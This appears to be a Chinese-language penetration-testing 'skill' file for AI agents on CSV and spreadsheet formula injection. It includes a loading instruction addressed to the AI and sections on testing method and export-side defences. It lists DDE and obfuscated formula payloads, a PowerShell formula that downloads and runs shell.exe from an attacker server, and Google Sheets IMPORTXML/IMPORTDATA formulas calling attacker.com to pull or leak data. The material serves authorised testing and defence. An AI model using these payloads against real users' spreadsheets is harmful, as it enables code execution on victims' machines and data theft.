# 技能：CSV公式注入

> **AI加载指令**：此技能涵盖CSV和电子表格环境中的公式/DDE风格注入、混淆、云表格基础操作以及安全测试方法。仅在**明确授权**的情况下使用；调用本地命令或远程获取的载荷具有**重大影响**—优先选择实验室目标并获取文档授权。未经程序规则允许客户端执行测试的情况下，不得针对最终用户。

## 0. 快速入门

在Excel、LibreOffice Calc或类似软件中打开单元格时可能触发公式计算的字符：

```text
=
+
-
@
```

测试单元格可能如下所示：

```csv
name,value
test,=1+1
test,+1+1
test,-1+1
test,@SUM(1+1)
```

**路由说明**：在测试CSV导出、后端报告或电子表格中打开的用户数据时，优先考虑这些前缀字符。

## 1. DDE注入（Excel / LibreOffice）

动态数据交换（DDE）和历史上在电子表格中滥用的外部调用模式。在**受控实验室**中复制的示例：

```text
DDE("cmd";"/C calc";"!A0")A0
```

```text
@SUM(1+1)*cmd|' /C calc'!A0
```

```text
=2+5+cmd|' /C calc'!A0
```

```text
=cmd|' /C calc'!'A1'
```

PowerShell风格链式操作（仅限实验室；将主机和载荷替换为无害等效项）：

```text
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

---

## 2. 混淆

防御性解析器可能会移除明显模式；测试人员可能会尝试噪声和空格（仍仅限允许情况下）：

```text
AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
```

`=`之后的多余空格：

```text
=         cmd|'/c calc.exe'!A
```

分散字符/非寻常空格（概念性模式—根据解析器调整）：

```text
=    C    m D    |'/c calc.exe'!A
```

`rundll32`风格：

```text
=rundll32|'URL.dll,OpenURL calc.exe'!A
```

## 3. GOOGLE SHEETS

如果导出的数据稍后在**Google Sheets**中打开，或者工作表从不可信的CSV中获取，这些函数可能引发**出站请求**或**跨文档数据拉取**：

**数据窃取/探测（将URL替换为您的授权回调）**：

```text
=IMPORTXML("http://attacker.com/", "//a/@href")
```

其他高风险导入：

```text
=IMPORTRANGE("spreadsheet_url", "range")
=IMPORTHTML("http://attacker.com/table", "table", 1)
=IMPORTFEED("http://attacker.com/feed.xml")
=IMPORTDATA("http://attacker.com/data.csv")
```

## 4. 测试方法

1. **映射汇点** — 任何输出**CSV、XLSX或制表符分隔**格式的功能：管理员导出、审计日志、用户名册、账单报告、搜索结果。
2. **追踪用户控制字段** — 个人资料字段、工单标题、交易备忘录、标签、ZIP导出中的文件名—任何回显存储输入的列。
3. **注入公式前缀** — 从无害算术（`=1+1`，`+1+1`）开始检测计算；根据规则提升。
4. **在目标软件中打开** — 匹配受害者工作流程：桌面Excel、LibreOffice、Google Sheets导入、特定区域的小数分隔符。
5. **证据** — 截图/捕获单元格是否显示计算结果、安全警告或DDE提示；记录产品版本。

**注意**：关注`用户输入 -> 导出 -> 在电子表格软件中打开`链。

---

## 5. 防御

应用和导出层缓解措施：

- **单引号前缀** — 在许多电子表格应用中，开头的`'`强制**文本**解释：`'=cmd|...`按字面显示。
- **制表符前缀** — 某些管道在正确摄入时将制表符前缀字段视为非公式文本。
- **移除或中和前导触发器** — 在导出时移除或转义`=`、`+`、`-`、`@`（以及Unicode类似字符）。
- **CSV编码** — 使用一致引号；验证列类型；未经清理，避免将原始公式字符串传递到财务/报告模板。
- **用户教育** — 未制定政策前，不得启用外部数据/DDE。

示例安全导出转换（概念性）：

```text
输入:  =1+1
输出: '=1+1   OR   \t=1+1   OR   (无前缀)根据RFC 4180转义引号
```

**注意**：在关联业务导出、报告和API导出参数时，结合注入、业务逻辑和API安全技能。
